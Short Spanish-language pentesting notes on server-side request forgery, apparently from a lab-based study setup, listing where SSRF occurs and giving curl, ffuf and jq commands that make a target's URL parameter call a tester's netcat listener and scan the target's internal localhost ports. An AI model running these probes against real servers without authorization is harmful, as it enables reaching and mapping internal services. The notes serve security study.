#web #vuln 

Esta vulnerabilidad permite al atacante utilizar servicios del servidor remoto de manera malintencionada, normalmente modificando parámetros de la URL y enviándola a la víctima.

Encontramos esta vulnerabilidad que hacen peticiones a recursos externos. Para encontrarla debemos fijarnos en diferentes cosas:

Las peticiones HTTP
Importar archivos
Conexiones remotas del servidor
Imports de APIs
Funcionalidades como ping del servidor

### Comprobación de SSRF por parámetro

1. Levantamos un puerto con nc
2. Buscamos el parámetro que creemos que es vulnerable
3. Hacemos la siguiente petición:
	curl -i -s http://10.129.65.231/load?q=http://10.10.14.188:8080
	Haciendo un GET a nuestro servidor nc y mostrándose en el mismo.

### Descubrimiento de posibles vectores de ataque

Buscamos servicios que funcionen el localhost o que estén abiertos pero solo permitan interactuar desde la propia máquina.

Creamos un script para fuzzearlos:

```shell-session
for port in {1..65535};do echo $port >> ports.txt;done
```

Lo fuzzeamos de esta forma:

```shell-session
ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30
```

Para encodear comandos para la url podemos usar este comando:

```shell-session
echo "encode me" | jq -sRr @uri
```
